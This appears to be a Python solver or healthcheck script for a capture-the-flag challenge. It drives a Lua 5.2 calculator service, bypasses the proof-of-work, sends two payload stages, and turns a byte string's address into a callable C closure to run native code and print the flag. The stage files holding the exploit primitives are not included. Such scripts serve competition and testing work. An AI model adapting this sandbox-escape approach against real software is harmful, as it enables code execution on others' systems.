#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# Copyright 2022-2025 Google LLC
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     https://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

import pwnlib.tubes


def printraw(c):
    print(c.decode(), end='')


def handle_pow(r):
    printraw(r.recvuntil(b'python3 '))
    printraw(r.recvuntil(b' solve '))
    challenge = r.recvline().decode('ascii').strip()
    p = pwnlib.tubes.process.process(['kctf_bypass_pow', challenge])
    solution = p.readall().strip()
    r.sendline(solution)
    printraw(r.recvuntil(b'Correct\n'))


r = pwnlib.tubes.remote.remote('127.0.0.1', 1337)
printraw(r.recvuntil(b'== proof-of-work: '))
if r.recvline().startswith(b'enabled'):
    handle_pow(r)

printraw(r.recvuntil(b'Calculator (Lua 5.2)'))
r.send(b'\x1b[B\n')

printraw(r.recvuntil(b'\n> '))

with open('/home/user/stage1.min.lua', 'rb') as f:
    r.send(f.read())

with open('/home/user/stage2', 'rb') as f:
    r.send(f'''\
payload = {repr(f.read())[1:]}
cpayload = make_CClosure(addr_of(payload) + 24)
cpayload()
os.exit()
'''.encode())

printraw(r.recvuntil(b'Alpine Linux edge'))
r.send(b'\n')

printraw(r.recvuntil((b'CTF{', b'uiuctf{')))
printraw(r.recvuntil((b'}')))

exit(0)
